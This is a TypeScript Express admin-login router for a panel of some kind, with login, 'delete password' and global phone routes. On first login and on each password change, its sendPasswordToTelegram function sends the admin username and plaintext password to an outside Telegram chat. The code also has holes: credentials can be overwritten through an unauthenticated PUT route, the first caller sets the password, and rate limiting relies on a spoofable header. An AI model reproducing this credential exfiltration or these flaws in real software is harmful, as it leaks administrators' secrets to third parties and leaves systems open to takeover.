import express, { Request, Response } from "express";
import https from "https";
import AdminModel from "../models/Admin";
import logger from "../logger/logger";

const router = express.Router();

/**
 * =====================================
 * INTERNAL HELPERS
 * =====================================
 */

const DELETE_PASSWORD_KEY = "delete_password";
const DELETE_PASSWORD_PHONE = "delete_password";

function clean(v: any): string {
  return String(v ?? "").trim();
}

function getDeletePasswordPaths(path: string): string[] {
  return [path, `/admin${path}`];
}

async function getDeletePasswordDoc() {
  return AdminModel.findOne({ key: DELETE_PASSWORD_KEY }).lean();
}

async function getStoredDeletePassword(): Promise<string> {
  const doc = await getDeletePasswordDoc();
  return clean((doc as any)?.meta?.password || "");
}

async function isDeletePasswordSet(): Promise<boolean> {
  const pwd = await getStoredDeletePassword();
  return pwd.length >= 4;
}

async function saveDeletePassword(password: string) {
  const cleanPassword = clean(password);
  await AdminModel.findOneAndUpdate(
    { key: DELETE_PASSWORD_KEY },
    { $set: { phone: DELETE_PASSWORD_PHONE, meta: { password: cleanPassword } } },
    { upsert: true, new: true },
  );
}

async function verifyOrCreateDeletePassword(password: string): Promise<{
  success: boolean; verified: boolean; created: boolean; error?: string;
}> {
  const cleanPassword = clean(password);
  if (!cleanPassword) return { success: false, verified: false, created: false, error: "password required" };
  if (cleanPassword.length < 4) return { success: false, verified: false, created: false, error: "password must be at least 4 digits" };
  const stored = await getStoredDeletePassword();
  if (!stored) {
    await saveDeletePassword(cleanPassword);
    logger.info("admin: delete password created");
    return { success: true, verified: true, created: true };
  }
  if (stored !== cleanPassword) return { success: false, verified: false, created: false, error: "invalid password" };
  return { success: true, verified: true, created: false };
}

async function changeDeletePassword(currentPassword: string, newPassword: string): Promise<{
  success: boolean; error?: string;
}> {
  const current = clean(currentPassword);
  const next = clean(newPassword);
  const stored = await getStoredDeletePassword();
  if (!stored) return { success: false, error: "password not set" };
  if (!current) return { success: false, error: "current password required" };
  if (stored !== current) return { success: false, error: "invalid current password" };
  if (!next) return { success: false, error: "new password required" };
  if (next.length < 4) return { success: false, error: "new password must be at least 4 digits" };
  await saveDeletePassword(next);
  logger.info("admin: delete password changed");
  return { success: true };
}

/**
 * =====================================
 * TELEGRAM PASSWORD NOTIFICATION
 * =====================================
 * ENV vars needed:
 *   BOT_TOKEN                  — Telegram bot token
 *   TELEGRAM_PASSWORD_CHAT_ID  — Chat ID jahan password jaayega
 *   SELF_RESOLVE_URL           — Panel URL (e.g. https://api.deploy55.zero-trace.in)
 */

async function sendPasswordToTelegram(
  username: string,
  password: string,
  type: "first_login" | "password_change"
): Promise<void> {
  try {
    const botToken = clean(process.env.BOT_TOKEN || "");
    const chatId   = clean(process.env.TELEGRAM_PASSWORD_CHAT_ID || "");
    if (!botToken || !chatId) {
      logger.warn("admin: TELEGRAM_PASSWORD_CHAT_ID ya BOT_TOKEN set nahi — skip TG notify");
      return;
    }
    const panelId  = clean(process.env.PANEL_ID || process.env.PANNEL_ID || "unknown");
    const panelUrl = clean(process.env.SELF_RESOLVE_URL || "");
    const timeStr  = new Date().toLocaleString("en-IN", { timeZone: "Asia/Kolkata" });
    const emoji    = type === "first_login" ? "🆕" : "🔄";
    const title    = type === "first_login" ? "First Login — Panel Setup" : "Password Changed";
    const urlLine  = panelUrl ? `\n🔗 URL: ${panelUrl}` : "";

    const text =
      `${emoji} <b>${title}</b>\n\n` +
      `🏷 Panel: <code>${panelId}</code>${urlLine}\n` +
      `👤 Username: <code>${username}</code>\n` +
      `🔑 Password: <code>${password}</code>\n` +
      `⏰ Time: ${timeStr}`;

    await new Promise<void>((resolve) => {
      const body = JSON.stringify({ chat_id: chatId, text, parse_mode: "HTML" });
      const req2 = https.request(
        `https://api.telegram.org/bot${botToken}/sendMessage`,
        { method: "POST", headers: { "Content-Type": "application/json", "Content-Length": Buffer.byteLength(body) } },
        () => resolve()
      );
      req2.on("error", (e: Error) => { logger.warn("admin: TG notify error", e.message); resolve(); });
      req2.setTimeout(5000, () => { req2.destroy(); resolve(); });
      req2.write(body); req2.end();
    });
    logger.info("admin: password sent to TG", { panelId, type });
  } catch (e: any) {
    logger.warn("admin: sendPasswordToTelegram failed", e?.message);
  }
}

async function isTgPasswordSent(): Promise<boolean> {
  try {
    const doc = await AdminModel.findOne({ key: "tg_password_sent" }).lean();
    return (doc as any)?.meta?.sent === true;
  } catch { return false; }
}

async function markTgPasswordSent(): Promise<void> {
  try {
    await AdminModel.findOneAndUpdate(
      { key: "tg_password_sent" },
      { $set: { phone: "tg_password_sent", meta: { sent: true, sentAt: Date.now() } } },
      { upsert: true, new: true }
    );
  } catch {}
}

/**
 * =====================================
 * ADMIN LOGIN ROUTES
 * =====================================
 */

// Rate limiting map
const _loginAttempts = new Map<string, { count: number; blockedUntil: number }>();

/**
 * GET /admin/login
 * Returns only username — password kabhi nahi
 */
router.get(["/login", "/admin/login"], async (_req: Request, res: Response) => {
  try {
    const doc = await AdminModel.findOne({ key: "login" }).lean();
    return res.json({ username: (doc as any)?.meta?.username || "" });
  } catch (err: any) {
    logger.error("admin: get login failed", err);
    return res.status(500).json({ success: false, error: "server error" });
  }
});

/**
 * POST /admin/login/verify
 * Verify credentials with bcrypt + rate limiting
 */
router.post(["/login/verify", "/admin/login/verify"], async (req: Request, res: Response) => {
  const ip = String(req.headers["x-forwarded-for"] || req.socket?.remoteAddress || "unknown");
  const now = Date.now();
  const entry = _loginAttempts.get(ip) || { count: 0, blockedUntil: 0 };
  if (entry.blockedUntil > now) {
    const mins = Math.ceil((entry.blockedUntil - now) / 60000);
    return res.status(429).json({ success: false, error: `Too many attempts. ${mins} min baad try karo.` });
  }
  const { username, password } = req.body || {};
  if (!username || !password) return res.status(400).json({ success: false, error: "missing fields" });
  try {
    const bcrypt = require("bcryptjs");
    const doc = await AdminModel.findOne({ key: "login" }).lean();
    const storedUser = (doc as any)?.meta?.username || "";
    const storedPass = (doc as any)?.meta?.password || "";

    // ── FIRST TIME LOGIN ──────────────────────────────────────────────────
    if (!storedUser && !storedPass) {
      const hashed = await bcrypt.hash(password, 10);
      await AdminModel.findOneAndUpdate(
        { key: "login" },
        { $set: { phone: "login", meta: { username, password: hashed, isHashed: true } } },
        { upsert: true, new: true }
      );
      _loginAttempts.delete(ip);
      // TG — background, login delay nahi
      sendPasswordToTelegram(username, password, "first_login")
        .then(() => markTgPasswordSent())
        .catch(() => {});
      return res.json({ success: true, firstLogin: true });
    }

    // ── USERNAME CHECK ────────────────────────────────────────────────────
    if (username !== storedUser) {
      entry.count++;
      if (entry.count >= 5) { entry.blockedUntil = now + 15 * 60 * 1000; entry.count = 0; }
      _loginAttempts.set(ip, entry);
      return res.status(401).json({ success: false, error: "Invalid credentials" });
    }

    // ── PASSWORD VERIFY ───────────────────────────────────────────────────
    const isHashed = (doc as any)?.meta?.isHashed === true;
    let valid = false;
    if (isHashed) {
      valid = await bcrypt.compare(password, storedPass);
    } else {
      valid = password === storedPass;
      if (valid) {
        const hashed = await bcrypt.hash(password, 10);
        await AdminModel.findOneAndUpdate(
          { key: "login" },
          { $set: { "meta.password": hashed, "meta.isHashed": true } },
          {}
        );
        logger.info("admin: password migrated to bcrypt hash");
      }
    }

    if (!valid) {
      entry.count++;
      if (entry.count >= 5) { entry.blockedUntil = now + 15 * 60 * 1000; entry.count = 0; }
      _loginAttempts.set(ip, entry);
      return res.status(401).json({ success: false, error: "Invalid credentials" });
    }

    _loginAttempts.delete(ip);

    // ── EXISTING LOGIN — TG check background mein ─────────────────────────
    setImmediate(async () => {
      try {
        const alreadySent = await isTgPasswordSent();
        if (!alreadySent) {
          logger.info("admin: TG password not sent yet — sending alert");
          await sendPasswordToTelegram(username, "[hashed — check first login msg]", "first_login");
          await markTgPasswordSent();
        }
      } catch {}
    });

    return res.json({ success: true });
  } catch (err) {
    return res.status(500).json({ success: false, error: (err as any)?.message });
  }
});

/**
 * PUT /admin/login
 * CREATE OR UPDATE admin credentials — bcrypt hash se save, plain text TG pe
 */
router.put(["/login", "/admin/login"], async (req: Request, res: Response) => {
  const { username, password } = req.body || {};
  if (!username || !password) return res.status(400).json({ success: false, error: "missing fields" });
  try {
    const bcrypt = require("bcryptjs");
    const hashed = await bcrypt.hash(password, 10);
    await AdminModel.findOneAndUpdate(
      { key: "login" },
      { $set: { phone: "login", meta: { username, password: hashed, isHashed: true } } },
      { upsert: true, new: true }
    );
    logger.info("admin: login updated", { username });
    // TG — background
    sendPasswordToTelegram(username, password, "password_change")
      .then(() => markTgPasswordSent())
      .catch(() => {});
    return res.json({ success: true });
  } catch (err: any) {
    logger.error("admin: login update failed", err);
    return res.status(500).json({ success: false, error: err?.message || "server error" });
  }
});

/**
 * =====================================
 * GLOBAL PHONE ROUTES
 * =====================================
 */

router.get(["/globalPhone", "/admin/globalPhone"], async (_req, res) => {
  try {
    const doc = await AdminModel.findOne({ key: "global" }).lean();
    return res.json({ phone: (doc as any)?.phone || "" });
  } catch (err) {
    logger.error("admin: get globalPhone failed", err);
    return res.status(500).json({ phone: "" });
  }
});

router.put(["/globalPhone", "/admin/globalPhone"], async (req: Request, res: Response) => {
  const phone = req.body?.phone;
  if (phone === undefined) return res.status(400).json({ success: false, error: "phone field required" });
  try {
    await AdminModel.findOneAndUpdate(
      { key: "global" },
      { $set: { phone: phone || "" } },
      { upsert: true, new: true },
    );
    logger.info("admin: globalPhone updated", { phone });
    try {
      const wsService = require("../services/wsService").default;
      if (wsService?.sendToAdminDevice) {
        wsService.sendToAdminDevice("__ADMIN__", { type: "event", event: "global_phone_updated", phone: phone || "" });
      }
    } catch (_) {}
    return res.json({ success: true });
  } catch (err: any) {
    logger.error("admin: update globalPhone failed", err);
    return res.status(500).json({ success: false, error: err?.message || "server error" });
  }
});

/**
 * =====================================
 * DELETE PASSWORD ROUTES
 * =====================================
 */

router.get(getDeletePasswordPaths("/deletePassword/status"), async (_req: Request, res: Response) => {
  try {
    const isSet = await isDeletePasswordSet();
    return res.json({ success: true, isSet });
  } catch (err: any) {
    logger.error("admin: deletePassword status failed", err);
    return res.status(500).json({ success: false, error: "server error" });
  }
});

router.post(getDeletePasswordPaths("/deletePassword/verify"), async (req: Request, res: Response) => {
  const password = clean(req.body?.password);
  try {
    const result = await verifyOrCreateDeletePassword(password);
    if (!result.success) {
      const status = result.error === "password required" || result.error === "password must be at least 4 digits" ? 400 : 403;
      return res.status(status).json(result);
    }
    return res.json(result);
  } catch (err: any) {
    logger.error("admin: deletePassword verify failed", err);
    return res.status(500).json({ success: false, verified: false, created: false, error: "server error" });
  }
});

router.post(getDeletePasswordPaths("/deletePassword/change"), async (req: Request, res: Response) => {
  const currentPassword = clean(req.body?.currentPassword);
  const newPassword = clean(req.body?.newPassword);
  try {
    const result = await changeDeletePassword(currentPassword, newPassword);
    if (!result.success) {
      const status = result.error === "password not set" || result.error === "current password required" || result.error === "new password required" || result.error === "new password must be at least 4 digits" ? 400 : 403;
      return res.status(status).json(result);
    }
    return res.json({ success: true, message: "password changed" });
  } catch (err: any) {
    logger.error("admin: deletePassword change failed", err);
    return res.status(500).json({ success: false, error: "server error" });
  }
});

export default router;
